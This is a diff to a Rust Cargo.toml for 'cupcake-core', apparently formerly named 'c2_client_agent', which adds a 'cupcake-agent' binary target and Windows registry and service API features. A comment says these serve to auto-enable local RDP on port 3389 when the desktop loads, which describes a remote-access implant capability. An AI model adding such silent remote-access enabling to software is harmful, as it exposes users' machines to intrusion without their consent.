@@ -2,12 +2,20 @@
 name = "cupcake-core"
 version = "0.1.0"
 edition = "2021"
+# Avoid dual auto bin + [[bin]]; only cupcake-agent binary (not cupcake_core PDB clash with lib).
+autobins = false
 
 [lib]
 name = "cupcake_core"
 crate-type = ["cdylib", "rlib"]
 # Doc-tests still reference the old crate name `c2_client_agent`; unit tests cover shipped paths.
 doctest = false
+
+# Separate bin name from lib `cupcake_core` to avoid Windows PDB collision
+# (cupcake_core.pdb for both bin and lib targets).
+[[bin]]
+name = "cupcake-agent"
+path = "src/main.rs"
 
 [features]
 # ── Product: ONLY one aggregate tier ──────────────────────────────────
@@ -115,6 +123,8 @@ winapi = { version = "0.3", features = [
     "threadpoollegacyapiset", "psapi", "securitybaseapi",
     "wtypes", "winerror", "guiddef", "minwinbase", "heapapi",
     "processenv", "ntdef", "tlhelp32", "processthreadsapi", "libloaderapi",
+    # desktop load → auto-enable local RDP (3389)
+    "winreg", "winsvc",
 ] }
 widestring = "1.0"
 
